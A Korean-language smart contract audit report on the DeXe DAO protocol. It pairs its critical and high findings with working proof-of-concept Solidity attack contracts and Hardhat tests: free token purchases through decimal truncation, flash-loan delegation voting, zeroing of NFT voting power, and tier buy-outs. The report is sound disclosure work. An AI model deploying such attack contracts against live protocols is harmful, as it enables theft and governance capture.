**Lead Auditors**

[0kage](https://twitter.com/0kage_eth)

[Dacian](https://twitter.com/@DevDacian)


---

# 발견 사항 (Findings)
## 치명적 위험 (Critical Risk)


### `TokenSaleProposal::buy`가 구매 토큰이 18 소수점이라고 암시적으로 가정하여 DAO 풀에 총체적 손실을 초래할 수 있음

**설명:** `TokenSaleProposalBuy::buy`는 사전 승인된 토큰을 사용하여 DAO 토큰을 구매하려는 사용자에 의해 호출됩니다. 이번 판매의 교환 비율은 특정 티어에 대해 사전 할당됩니다. 이 함수는 내부적으로 `TokenSaleProposalBuy::_purchaseWithCommission`을 호출하여 구매자로부터 거버넌스 풀로 자금을 이동합니다. 이동된 자금의 일부는 DexeDAO 수수료를 지불하는 데 사용되며 잔액은 `GovPool` 주소로 전송됩니다. 이를 위해 `TokenSaleProposalBuy::_sendFunds`가 호출됩니다.

```solidity
    function _sendFunds(address token, address to, uint256 amount) internal {
        if (token == ETHEREUM_ADDRESS) {
            (bool success, ) = to.call{value: amount}("");
            require(success, "TSP: failed to transfer ether");
        } else {
  >>          IERC20(token).safeTransferFrom(msg.sender, to, amount.from18(token.decimals())); //@audit -> amount is assumed to be 18 decimals
        }
    }
```

이 함수는 ERC20 토큰의 `amount`가 항상 18 소수점이라고 가정합니다. `DecimalsConverter::from18` 함수는 기본 소수점(18)에서 토큰 소수점으로 변환합니다. 금액이 구매자에 의해 직접 전달되며 `_sendFunds`가 호출되기 전에 토큰 소수점이 18 소수점으로 변환되도록 보장하는 사전 정규화가 수행되지 않는다는 점에 유의하십시오.


**영향:** 더 작은 소수점을 가진 토큰(예: 6 소수점을 가진 USDC)의 경우 DAO에 총체적인 손실을 초래할 것임을 쉽게 알 수 있습니다. 이러한 경우 금액은 18 소수점으로 추정되며 토큰 소수점(6)으로 변환할 때 이 숫자는 0으로 내림될 수 있습니다.

**개념 증명 (Proof of Concept):**
- Tier 1은 사용자가 DAO 토큰을 교환 비율 1 DAO 토큰 = 1 USDC로 구매할 수 있도록 합니다.
- 사용자가 1000 Dao 토큰을 구매하려고 하며 `buy(1, USDC, 1000*10**6)`와 함께 `TokenSaleProposal::buy`를 호출합니다.
- Dexe DAO 수수료는 단순화를 위해 0%로 가정 -> `sendFunds`는 `sendFunds(USDC, govPool, 1000* 10**6)`와 함께 호출됩니다.
- `DecimalConverter::from18` 함수는 기본 소수점 18, 대상 소수점 6으로 금액에 대해 호출됩니다: `from18(1000*10**6, 18, 6)`
- 이는 `1000*10**6/10*(18-6) = 1000/ 10**6`을 제공하며 이는 0으로 반올림됩니다.

구매자는 1000 DAO 토큰을 무료로 청구할 수 있습니다. 이는 DAO에 대한 총체적 손실입니다.

PoC를 `TokenSaleProposal.test.js`에 추가하십시오:

먼저 [L76](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/test/gov/proposals/TokenSaleProposal.test.js#L76) 주변에 새 줄을 추가하여 새로운 `purchaseToken3`를 추가하십시오:
```javascript
      let purchaseToken3;
```

그런 다음 [L528](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/test/gov/proposals/TokenSaleProposal.test.js#L528) 주변에 새 줄을 추가하십시오:
```javascript
      purchaseToken3 = await ERC20Mock.new("PurchaseMockedToken3", "PMT3", 6);
```

그런 다음 [L712](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/test/gov/proposals/TokenSaleProposal.test.js#L712) 주변에 새 티어를 추가하십시오:
```javascript
        {
          metadata: {
            name: "tier 9",
            description: "the ninth tier",
          },
          totalTokenProvided: wei(1000),
          saleStartTime: timeNow.toString(),
          saleEndTime: (timeNow + 10000).toString(),
          claimLockDuration: "0",
          saleTokenAddress: saleToken.address,
          purchaseTokenAddresses: [purchaseToken3.address],
          exchangeRates: [PRECISION.times(1).toFixed()],
          minAllocationPerUser: 0,
          maxAllocationPerUser: 0,
          vestingSettings: {
            vestingPercentage: "0",
            vestingDuration: "0",
            cliffPeriod: "0",
            unlockStep: "0",
          },
          participationDetails: [],
        },
```

그런 다음 `describe("if added to whitelist", () => {` 섹션 아래에 테스트 자체를 추가하십시오:
```javascript
          it("audit buy implicitly assumes that buy token has 18 decimals resulting in loss to DAO", async () => {
            await purchaseToken3.approve(tsp.address, wei(1000));

            // tier9 has the following parameters:
            // totalTokenProvided   : wei(1000)
            // minAllocationPerUser : 0 (no min)
            // maxAllocationPerUser : 0 (no max)
            // exchangeRate         : 1 sale token for every 1 purchaseToken
            //
            // purchaseToken3 has 6 decimal places
            //
            // mint purchase tokens to owner 1000 in 6 decimal places
            //                        1000 000000
            let buyerInitTokens6Dec = 1000000000;

            await purchaseToken3.mint(OWNER, buyerInitTokens6Dec);
            await purchaseToken3.approve(tsp.address, buyerInitTokens6Dec, { from: OWNER });

            //
            // start: buyer has bought no tokens
            let TIER9 = 9;
            let purchaseView = userViewsToObjects(await tsp.getUserViews(OWNER, [TIER9]))[0].purchaseView;
            assert.equal(purchaseView.claimTotalAmount, wei(0));

            // buyer attempts to purchase using 100 purchaseToken3 tokens
            // purchaseToken3 has 6 decimals but all inputs to Dexe should be in
            // 18 decimals, so buyer formats input amount to 18 decimals
            // doing this first to verify it works correctly
            let buyInput18Dec = wei("100");
            await tsp.buy(TIER9, purchaseToken3.address, buyInput18Dec);

            // buyer has bought wei(100) sale tokens
            purchaseView = userViewsToObjects(await tsp.getUserViews(OWNER, [TIER9]))[0].purchaseView;
            assert.equal(purchaseView.claimTotalAmount, buyInput18Dec);

            // buyer has 900 000000 remaining purchaseToken3 tokens
            assert.equal((await purchaseToken3.balanceOf(OWNER)).toFixed(), "900000000");

            // next buyer attempts to purchase using 100 purchaseToken3 tokens
            // but sends input formatted into native 6 decimals
            // sends 6 decimal input: 100 000000
            let buyInput6Dec = 100000000;
            await tsp.buy(TIER9, purchaseToken3.address, buyInput6Dec);

            // buyer has bought an additional 100000000 sale tokens
            purchaseView = userViewsToObjects(await tsp.getUserViews(OWNER, [TIER9]))[0].purchaseView;
            assert.equal(purchaseView.claimTotalAmount, "100000000000100000000");

            // but the buyer still has 900 000000 remaining purchasetoken3 tokens
            assert.equal((await purchaseToken3.balanceOf(OWNER)).toFixed(), "900000000");

            // by sending the input amount formatted to 6 decimal places,
            // the buyer was able to buy small amounts of the token being sold
            // for free!
          });
```

마지막으로 다음 명령으로 테스트를 실행하십시오: `npx hardhat test --grep "audit buy implicitly assumes that buy token has 18 decimals resulting in loss to DAO"`

**권장 완화 방법:** 이 문제를 완화하기 위한 최소 2가지 옵션이 있습니다:

옵션 1 - 기본 토큰 소수점이 18이 아닌 경우에도 모든 토큰 금액을 18 소수점으로 전송해야 한다는 설계 결정을 수정하여 대신 모든 토큰 금액을 기본 소수점으로 전송하고 Dexe가 모든 것을 변환하도록 합니다.

옵션 2 - 현재 설계를 유지하되 [L90](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/libs/gov/token-sale-proposal/TokenSaleProposalBuy.sol#L90)에서 `amount.from18(token.decimals()) == 0`인 경우 되돌리거나(revert), 대안으로 변환이 0인 경우 되돌리는 [`_convertSafe()`](https://github.com/dl-solarity/solidity-lib/blob/master/contracts/libs/utils/DecimalsConverter.sol#L248)를 사용하는 [`from18Safe()`](https://github.com/dl-solarity/solidity-lib/blob/master/contracts/libs/utils/DecimalsConverter.sol#L124) 함수를 사용합니다.

프로젝트 팀은 동일한 패턴이 발생하여 동일한 취약점이 있을 수 있고 변환이 0을 반환할 경우 되돌려야 할 수 있는 다른 영역도 검토해야 합니다:

* `GovUserKeeper` [L92](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L92), [L116](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L116), [L183](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L183)
* `GovPool` [L248](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/GovPool.sol#L248)
* `TokenSaleProposalWhitelist` [L50](https://github.com/dexe-network/DeXe-Protocol/blob/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/libs/gov/token-sale-proposal/TokenSaleProposalWhitelist.sol#L50)
* `ERC721Power` [L113](https://github.com/dexe-network/DeXe-Protocol/blob/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/ERC721/ERC721Power.sol#L113), [L139](https://github.com/dexe-network/DeXe-Protocol/blob/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/ERC721/ERC721Power.sol#L139)
* `TokenBalance` [L35](https://github.com/dexe-network/DeXe-Protocol/blob/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/libs/utils/TokenBalance.sol#L35), [L62](https://github.com/dexe-network/DeXe-Protocol/blob/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/libs/utils/TokenBalance.sol#L62)

**Dexe:**
커밋 [c700d9f](https://github.com/dexe-network/DeXe-Protocol/commit/c700d9f9f328d1df853891b52fd3527b56a6f1df)에서 수정되었습니다.

**Cyfrin:** 확인됨. 다른 곳은 변경되었지만 `TokenBalance::sendFunds()`는 여전히 `from18Safe()` 대신 `from18()`을 사용하며, `TokenBalance::sendFunds()`를 직접 호출할 때 사용자 입력을 허용하는 코드베이스의 다른 부분도 유사한 문제의 영향을 받을 수 있습니다.

예를 들어 `TokenSaleProposalWhitelist::unlockParticipationTokens()` - 사용자가 6 소수점 정밀도인 잠긴 토큰을 충분히 소량으로 잠금 해제하려고 시도하면, 상태는 잠금 해제가 성공한 것처럼 업데이트되지만 `TokenBalance::sendFunds()`의 결과 변환은 0으로 내림됩니다. 실행은 계속되어 사용자에게 0 토큰이 전송되지만 저장소가 업데이트되었으므로 해당 토큰은 영원히 잠긴 상태로 유지됩니다.

Dexe는 `TokenBalance::sendFunds()`의 `from18()` 변환이 0보다 큰 입력을 0으로 반올림해야 하고 트랜잭션이 되돌려지지 않고 0 토큰을 전송하면서 계속 실행되어야 하는 유효한 상황이 존재하는지 신중하게 고려해야 합니다. Cyfrin은 사용할 "기본" 변환이 `from18Safe()`이며 0으로의 변환이 명시적으로 허용되는 경우에만 `from18()`을 사용해야 한다고 권장합니다.


### 공격자는 플래시론과 위임 투표를 결합하여 제안을 결정하고 제안이 여전히 잠김(Locked) 상태인 동안 토큰을 인출할 수 있음

**설명:** 공격자는 플래시론과 위임 투표를 결합하여 기존 플래시론 완화 조치를 우회할 수 있으며, 이를 통해 공격자는 제안을 결정하고 제안이 여전히 잠김 상태인 동안 토큰을 인출할 수 있습니다. 전체 공격은 공격 계약을 통해 1번의 트랜잭션으로 수행될 수 있습니다.

**영향:** 공격자는 플래시론과 위임 투표를 결합하여 제안의 결과를 결정하기 위해 기존 플래시론 완화 조치를 우회할 수 있습니다.

**개념 증명 (Proof of Concept):** 공격 계약을 `mock/utils/FlashDelegationVoteAttack.sol`에 추가하십시오:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "../../interfaces/gov/IGovPool.sol";

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract FlashDelegationVoteAttack {
    //
    // how the attack contract works:
    //
    // 1) use flashloan to acquire large amount of voting tokens
    //    (caller transfer tokens to contract before calling to simplify PoC)
    // 2) deposit voting tokens into GovPool
    // 3) delegate voting power to slave contract
    // 4) slave contract votes with delegated power
    // 5) proposal immediately reaches quorum and moves into Locked state
    // 6) undelegate voting power from slave contract
    //    since undelegation works while Proposal is in locked state
    // 7) withdraw voting tokens from GovPool while proposal still in Locked state
    // 8) all in 1 txn
    //

    function attack(address govPoolAddress, address tokenAddress, uint256 proposalId) external {
        // verify that the attack contract contains the voting tokens
        IERC20 votingToken = IERC20(tokenAddress);

        uint256 votingPower = votingToken.balanceOf(address(this));
        require(votingPower > 0, "AttackContract: need to send tokens first");

        // create the slave contract that this contract will delegate to which
        // will do the actual vote
        FlashDelegationVoteAttackSlave slave = new FlashDelegationVoteAttackSlave();

        // deposit our tokens with govpool
        IGovPool govPool = IGovPool(govPoolAddress);

        // approval first
        (, address userKeeperAddress, , , ) = govPool.getHelperContracts();
        votingToken.approve(userKeeperAddress, votingPower);

        // then actual deposit
        govPool.deposit(address(this), votingPower, new uint256[](0));

        // verify attack contract has no tokens
        require(
            votingToken.balanceOf(address(this)) == 0,
            "AttackContract: balance should be 0 after depositing tokens"
        );

        // delegate our voting power to the slave
        govPool.delegate(address(slave), votingPower, new uint256[](0));

        // slave does the actual vote
        slave.vote(govPool, proposalId);

        // verify proposal now in Locked state as quorum was reached
        require(
            govPool.getProposalState(proposalId) == IGovPool.ProposalState.Locked,
            "AttackContract: proposal didnt move to Locked state after vote"
        );

        // undelegate our voting power from the slave
        govPool.undelegate(address(slave), votingPower, new uint256[](0));

        // withdraw our tokens
        govPool.withdraw(address(this), votingPower, new uint256[](0));

        // verify attack contract has withdrawn all tokens used in the delegated vote
        require(
            votingToken.balanceOf(address(this)) == votingPower,
            "AttackContract: balance should be full after withdrawing"
        );

        // verify proposal still in the Locked state
        require(
            govPool.getProposalState(proposalId) == IGovPool.ProposalState.Locked,
            "AttackContract: proposal should still be in Locked state after withdrawing tokens"
        );

        // attack contract can now repay flash loan
    }
}

contract FlashDelegationVoteAttackSlave {
    function vote(IGovPool govPool, uint256 proposalId) external {
        // slave has no voting power so votes 0, this will automatically
        // use the delegated voting power
        govPool.vote(proposalId, true, 0, new uint256[](0));
    }
}
```

`GovPool.test.js`의 `describe("getProposalState()", () => {` 아래에 단위 테스트를 추가하십시오:
```javascript
      it("audit attacker combine flash loan with delegation to decide vote then immediately withdraw loaned tokens by undelegating", async () => {
        await changeInternalSettings(false);

        // setup the proposal
        let proposalId = 2;
        await govPool.createProposal(
          "example.com",
          [[govPool.address, 0, getBytesGovVote(proposalId, wei("100"), [], true)]],
          [[govPool.address, 0, getBytesGovVote(proposalId, wei("100"), [], false)]]
        );

        assert.equal(await govPool.getProposalState(proposalId), ProposalState.Voting);

        // setup the attack contract
        const AttackContractMock = artifacts.require("FlashDelegationVoteAttack");
        let attackContract = await AttackContractMock.new();

        // give SECOND's tokens to the attack contract
        let voteAmt = wei("100000000000000000000");
        await govPool.withdraw(attackContract.address, voteAmt, [], { from: SECOND });

        // execute the attack
        await attackContract.attack(govPool.address, token.address, proposalId);
      });
```

다음 명령으로 테스트를 실행하십시오: `npx hardhat test --grep "audit attacker combine flash loan with delegation"`.

**권장 완화 방법:** 동일한 블록에서 위임/위임 해제 및 입금/출금을 허용하지 않는 것과 같은 추가 방어 조치를 고려하십시오.

**Dexe:**
[PR166](https://github.com/dexe-network/DeXe-Protocol/commit/30b56c87c6c4902ec5a4c470d8a2812cd43dc53c)에서 수정되었습니다.

**Cyfrin:** 확인됨.


### 공격자는 `ERC721Power::totalPower` 및 모든 기존 NFT `currentPower`를 0으로 설정하여 사용자 투표권을 파괴할 수 있음

**설명:** 공격자는 `ERC721Power` [L144](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/ERC721/ERC721Power.sol#L144) 및 [L172](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/ERC721/ERC721Power.sol#L172)의 불일치("<" 대 "<=")를 악용하여 무허가 공격 계약을 통해 `ERC721Power::totalPower` 및 모든 기존 NFT의 `currentPower`를 0으로 설정하여 사용자 투표권을 파괴할 수 있습니다:

```solidity
function recalculateNftPower(uint256 tokenId) public override returns (uint256 newPower) {
    // @audit execution allowed to continue when
    // block.timestamp == powerCalcStartTimestamp
    if (block.timestamp < powerCalcStartTimestamp) {
        return 0;
    }
    // @audit getNftPower() returns 0 when
    // block.timestamp == powerCalcStartTimestamp
    newPower = getNftPower(tokenId);

    NftInfo storage nftInfo = nftInfos[tokenId];

    // @audit as this is the first update since power
    // calculation has just started, totalPower will be
    // subtracted by nft's max power
    totalPower -= nftInfo.lastUpdate != 0 ? nftInfo.currentPower : getMaxPowerForNft(tokenId);
    // @audit totalPower += 0 (newPower = 0 in above line)
    totalPower += newPower;

    nftInfo.lastUpdate = uint64(block.timestamp);
    // @audit will set nft's current power to 0
    nftInfo.currentPower = newPower;
}

function getNftPower(uint256 tokenId) public view override returns (uint256) {
    // @audit execution always returns 0 when
    // block.timestamp == powerCalcStartTimestamp
    if (block.timestamp <= powerCalcStartTimestamp) {
        return 0;
    }
```
이 공격은 전력 계산이 시작되는 정확한 블록(`block.timestamp == ERC721Power.powerCalcStartTimestamp`)에서 실행되어야 합니다.

**영향:** `ERC721Power::totalPower` 및 모든 기존 NFT의 `currentPower`가 0으로 설정되어 `ERC721Power`를 사용한 투표가 무효화됩니다. [스냅샷을 생성할 때 `totalPower`를 읽고](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L330-L331) [`GovUserKeeper::getNftsPowerInTokensBySnapshot()`이 NFT 계약이 존재하지 않는 것처럼 0을 반환](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L546-L548)하기 때문입니다. 또한 [제안 생성](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L604-L606) 기능에 부정적인 영향을 미칠 수 있습니다.

`ERC721Power` NFT의 개별 파워는 절대 증가할 수 없으므로 이 공격은 매우 파괴적입니다. 필요한 담보가 예치되지 않은 경우 시간이 지남에 따라 감소할 수만 있습니다. 전력 계산이 시작되자마자(`block.timestamp == ERC721Power.powerCalcStartTimestamp`) 모든 NFT의 `currentPower = 0`으로 설정하면 `ERC721Power` 계약은 사실상 완전히 "bricked"(사용 불능 상태)가 됩니다 - NFT 계약을 새 계약으로 교체하지 않는 한 이 공격을 "되돌릴" 방법이 없습니다.

Dexe-DAO는 [투표에 NFT만 사용하여](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L74) 생성할 수 있습니다. 이 경우 모든 NFT의 투표권이 파괴되는 이 취약점은 모든 사람의 투표권이 파괴되어 아무도 투표할 수 없으므로 새 DAO를 다시 배포해야 함을 의미합니다.

**개념 증명 (Proof of Concept):** 공격 계약 `mock/utils/ERC721PowerAttack.sol`을 추가하십시오:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "../../gov/ERC721/ERC721Power.sol";

import "hardhat/console.sol";

contract ERC721PowerAttack {
    // this attack can decrease ERC721Power::totalPower by the the true max power of all
    // the power nfts that exist (to zero), regardless of who owns them, and sets the current
    // power of all nfts to zero, totally bricking the ERC721Power contract.
    //
    // this attack only works when block.timestamp == nftPower.powerCalcStartTimestamp
    // as it takes advantage of a difference in getNftPower() & recalculateNftPower():
    //
    // getNftPower() returns 0 when block.timestamp <= powerCalcStartTimestamp
    // recalculateNftPower returns 0 when block.timestamp < powerCalcStartTimestamp
    function attack(
        address nftPowerAddr,
        uint256 initialTotalPower,
        uint256 lastTokenId
    ) external {
        ERC721Power nftPower = ERC721Power(nftPowerAddr);

        // verify attack starts on the correct block
        require(
            block.timestamp == nftPower.powerCalcStartTimestamp(),
            "ERC721PowerAttack: attack requires block.timestamp == nftPower.powerCalcStartTimestamp"
        );

        // verify totalPower() correct at starting block
        require(
            nftPower.totalPower() == initialTotalPower,
            "ERC721PowerAttack: incorrect initial totalPower"
        );

        // call recalculateNftPower() for every nft, this:
        // 1) decreases ERC721Power::totalPower by that nft's max power
        // 2) sets that nft's currentPower = 0
        for (uint256 i = 1; i <= lastTokenId; ) {
            require(
                nftPower.recalculateNftPower(i) == 0,
                "ERC721PowerAttack: recalculateNftPower() should return 0 for new nft power"
            );

            unchecked {
                ++i;
            }
        }

        require(
            nftPower.totalPower() == 0,
            "ERC721PowerAttack: after attack finished totalPower should equal 0"
        );
    }
}
```

테스트 하네스를 `ERC721Power.test.js`에 추가하십시오:
```javascript
    describe("audit attacker can manipulate ERC721Power totalPower", () => {
      it("audit attack 1 sets ERC721Power totalPower & all nft currentPower to 0", async () => {
        // deploy the ERC721Power nft contract with:
        // max power of each nft = 100
        // power reduction 10%
        // required collateral = 100
        let maxPowerPerNft = toPercent("100");
        let requiredCollateral = wei("100");
        let powerCalcStartTime = (await getCurrentBlockTime()) + 1000;
        // hack needed to start attack contract on exact block due to hardhat
        // advancing block.timestamp in the background between function calls
        let powerCalcStartTime2 = (await getCurrentBlockTime()) + 999;

        // create power nft contract
        await deployNft(powerCalcStartTime, maxPowerPerNft, toPercent("10"), requiredCollateral);

        // ERC721Power::totalPower should be zero as no nfts yet created
        assert.equal((await nft.totalPower()).toFixed(), toPercent("0").times(1).toFixed());

        // create the attack contract
        const ERC721PowerAttack = artifacts.require("ERC721PowerAttack");
        let attackContract = await ERC721PowerAttack.new();

        // create 10 power nfts for SECOND
        await nft.safeMint(SECOND, 1);
        await nft.safeMint(SECOND, 2);
        await nft.safeMint(SECOND, 3);
        await nft.safeMint(SECOND, 4);
        await nft.safeMint(SECOND, 5);
        await nft.safeMint(SECOND, 6);
        await nft.safeMint(SECOND, 7);
        await nft.safeMint(SECOND, 8);
        await nft.safeMint(SECOND, 9);
        await nft.safeMint(SECOND, 10);

        // verify ERC721Power::totalPower has been increased by max power for all nfts
        assert.equal((await nft.totalPower()).toFixed(), maxPowerPerNft.times(10).toFixed());

        // fast forward time to the start of power calculation
        await setTime(powerCalcStartTime2);

        // launch the attack
        await attackContract.attack(nft.address, maxPowerPerNft.times(10).toFixed(), 10);
      });
    });
```

다음 명령으로 공격을 실행하십시오: `npx hardhat test --grep "audit attack 1 sets ERC721Power totalPower & all nft currentPower to 0"`

**권장 완화 방법:** `ERC721Power` [L144](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/ERC721/ERC721Power.sol#L144) 및 [L172](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/ERC721/ERC721Power.sol#L172) 간의 불일치를 해결하십시오.

**Dexe:**
[PR174](https://github.com/dexe-network/DeXe-Protocol/commit/8c52fe4264d7868ab261ee789d0efe9f4edddfc2)에서 수정되었습니다.

**Cyfrin:** 확인됨.

\clearpage
## 높은 위험 (High Risk)


### 자금이 부족한 ETH 분배 제안을 생성하여 보상 청구가 되돌려지게 할 수 있음

**설명:** `DistributionProposal::execute()` [L62-63](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/proposals/DistributionProposal.sol#L62-L63)은 `amount == msg.value`인지 확인하지 않으므로 자금이 부족한 ETH 분배 제안을 생성하는 것이 가능합니다. `msg.value < amount`인 경우 자금이 부족한 분배 제안이 실행됩니다.

이는 악의적인 GovPool 소유자가 사용자에게 투표하도록 가짜 인센티브를 제공할 수 있는 공격 벡터를 엽니다. 보상 분배 시 소유자는 보상으로 약속된 금액을 보내지 않고 분배 제안을 실행할 수 있습니다. 결과적으로 사용자는 제안에 투표하고도 대가를 받지 못하게 됩니다.


**영향:** 자금이 부족한 분배 제안의 경우 `DistributionProposal::claim()`이 되돌려지므로 사용자는 보상을 청구할 수 없습니다. 누구나 `GovPool`을 생성할 수 있으므로 악의적인 의도로 인해 사용자에게 손실이 발생할 가능성이 있습니다.

**개념 증명 (Proof of Concept):** 이 PoC를 `describe("claim()", () => {` 섹션 아래의 `test/gov/proposals/DistributionProposal.test.js`에 추가하십시오:
```javascript
      it("under-funded eth distribution proposals prevents claiming rewards", async () => {
        // use GovPool to create a proposal with 10 wei reward
        await govPool.createProposal(
          "example.com",
          [[dp.address, wei("10"), getBytesDistributionProposal(1, ETHER_ADDR, wei("10"))]],
          [],
          { from: SECOND }
        );

        // Under-fund the proposal by calling DistributionProposal::execute() with:
        // 1) token     = ether
        // 2) amount    = X
        // 3) msg.value = Y, where Y < X
        //
        // This creates an under-funded proposal breaking the subsequent claim()
        await impersonate(govPool.address);
        await dp.execute(1, ETHER_ADDR, wei("10"), { value: wei(1), from: govPool.address });

        // only 1 vote so SECOND should get the entire 10 wei reward
        await govPool.vote(1, true, 0, [1], { from: SECOND });

        // attempting to claim the reward fails as the proposal is under-funded
        await truffleAssert.reverts(dp.claim(SECOND, [1]), "Gov: failed to send eth");
      });
```

`npx hardhat test --grep "under-funded eth distribution"`으로 실행하십시오.

**권장 완화 방법:** `DistributionProposal::execute()` [L62-63](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/proposals/DistributionProposal.sol#L62-L63)은 ETH 자금 조달 제안에 대해 `amount != msg.value`인 경우 되돌려야 합니다.

**Dexe:**
[PR164](https://github.com/dexe-network/DeXe-Protocol/commit/cdf9369193e1b2d6640c975d2c8e872710f6e065#diff-9559fcfcd35b0e7d69c24765fb0d5996a7b0b87781860c7f821867c26109814f)에서 수정되었습니다.

**Cyfrin:** 확인됨.


### 공격자는 토큰 판매 `maxAllocationPerUser` 제한을 우회하여 전체 티어를 매수할 수 있음

**설명:** 공격자는 이 제한 미만으로 여러 번 소액 매수를 수행하여 토큰 판매 `maxAllocationPerUser` 제한을 우회하고 전체 티어를 매수할 수 있습니다.

**영향:** 악용된 티어의 토큰을 구매할 수 없는 다른 사용자에게 영구적인 피해를 줍니다. 총 공급량에 따라 구매자는 토큰 판매에서 모두 사들임으로써 대부분의 토큰을 통제할 수 있으며, 의도한 대로 분배되는 것을 막고 시장을 독점적으로 통제할 수 있습니다. `maxAllocationPerUser` 제한은 의도한 대로 작동하지 않으며 누구나 쉽게 우회할 수 있습니다.

**개념 증명 (Proof of Concept):** 먼저 `test/gov/proposals/TokenSaleProposal.test.js` [L718](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/test/gov/proposals/TokenSaleProposal.test.js#L718)에 Tier 8을 추가하십시오:
```javascript
        {
          metadata: {
            name: "tier 8",
            description: "the eighth tier",
          },
          totalTokenProvided: wei(1000),
          saleStartTime: timeNow.toString(),
          saleEndTime: (timeNow + 10000).toString(),
          claimLockDuration: "0",
          saleTokenAddress: saleToken.address,
          purchaseTokenAddresses: [purchaseToken1.address],
          exchangeRates: [PRECISION.times(4).toFixed()],
          minAllocationPerUser: wei(10),
          maxAllocationPerUser: wei(100),
          vestingSettings: {
            vestingPercentage: "0",
            vestingDuration: "0",
            cliffPeriod: "0",
            unlockStep: "0",
          },
          participationDetails: [],
        },
```

그런 다음 [L1995](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/test/gov/proposals/TokenSaleProposal.test.js#L1995) 주변의 `describe("if added to whitelist", () => {` 섹션 아래의 동일한 파일에 PoC를 추가하십시오:
```javascript
          it("attacker can bypass token sale maxAllocationPerUser to buy out the entire tier", async () => {
            await purchaseToken1.approve(tsp.address, wei(1000));

            // tier8 has the following parameters:
            // totalTokenProvided   : wei(1000)
            // minAllocationPerUser : wei(10)
            // maxAllocationPerUser : wei(100)
            // exchangeRate         : 4 sale tokens for every 1 purchaseToken
            //
            // one user should at most be able to buy wei(100),
            // or 10% of the total tier.
            //
            // any user can bypass this limit by doing multiple
            // smaller buys to buy the entire tier.
            //
            // start: user has bought no tokens
            let TIER8 = 8;
            let purchaseView = userViewsToObjects(await tsp.getUserViews(OWNER, [TIER8]))[0].purchaseView;
            assert.equal(purchaseView.claimTotalAmount, wei(0));

            // if the user tries to buy it all in one txn,
            // maxAllocationPerUser is enforced and the txn reverts
            await truffleAssert.reverts(tsp.buy(TIER8, purchaseToken1.address, wei(250)), "TSP: wrong allocation");

            // but user can do multiple smaller buys to get around the
            // maxAllocationPerUser check which only checks each
            // txn individually, doesn't factor in the total amount
            // user has already bought
            await tsp.buy(TIER8, purchaseToken1.address, wei(25));
            await tsp.buy(TIER8, purchaseToken1.address, wei(25));
            await tsp.buy(TIER8, purchaseToken1.address, wei(25));
            await tsp.buy(TIER8, purchaseToken1.address, wei(25));
            await tsp.buy(TIER8, purchaseToken1.address, wei(25));
            await tsp.buy(TIER8, purchaseToken1.address, wei(25));
            await tsp.buy(TIER8, purchaseToken1.address, wei(25));
            await tsp.buy(TIER8, purchaseToken1.address, wei(25));
            await tsp.buy(TIER8, purchaseToken1.address, wei(25));
            await tsp.buy(TIER8, purchaseToken1.address, wei(25));

            // end: user has bought wei(1000) tokens - the entire tier!
            purchaseView = userViewsToObjects(await tsp.getUserViews(OWNER, [TIER8]))[0].purchaseView;
            assert.equal(purchaseView.claimTotalAmount, wei(1000));

            // attempting to buy more fails as the entire tier
            // has been bought by the single user
            await truffleAssert.reverts(
              tsp.buy(TIER8, purchaseToken1.address, wei(25)),
              "TSP: insufficient sale token amount"
            );
          });
```

PoC 실행: `npx hardhat test --grep "bypass token sale maxAllocationPerUser"`

